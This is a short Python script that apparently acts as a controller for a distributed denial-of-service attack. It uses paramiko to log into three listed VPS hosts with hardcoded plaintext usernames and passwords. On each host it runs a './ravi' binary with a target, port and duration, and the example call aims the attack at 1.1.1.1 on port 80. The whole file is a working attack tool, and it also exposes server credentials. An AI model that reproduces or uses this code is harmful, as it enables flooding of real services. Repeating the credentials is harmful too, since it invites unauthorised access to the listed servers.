import paramiko

# ✅ VPS LIST (IP, Username, Password/SSH-KEY)
VPS_LIST = [
    {"host": "167.99.120.129", "user": "master_gyqdyxpuzc", "password": "yJcKAy23DgUh"},
    {"host": "108.61.89.124", "user": "master_rpfumfsfsr", "password": "TbZ9dg9epr7z"},
    {"host": "207.246.127.196", "user": "master_mhfuqyupey", "password": "GT25wRh5JtJP"},
]

# ✅ Function to send attack command to a VPS
def send_attack(vps, target, port, duration):
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    ssh.connect(vps["host"], username=vps["user"], password=vps["password"])
    command = f"./ravi {target} {port} {duration} 1200"
    ssh.exec_command(command)
    ssh.close()

# ✅ Function to distribute attack across multiple VPS
def start_attack(target, port, duration):
    for vps in VPS_LIST:
        send_attack(vps, target, port, duration)
        print(f"🚀 Attack started on {vps['host']} - {target}:{port} for {duration}s")

# ✅ Example Usage:
start_attack("1.1.1.1", 80, 120)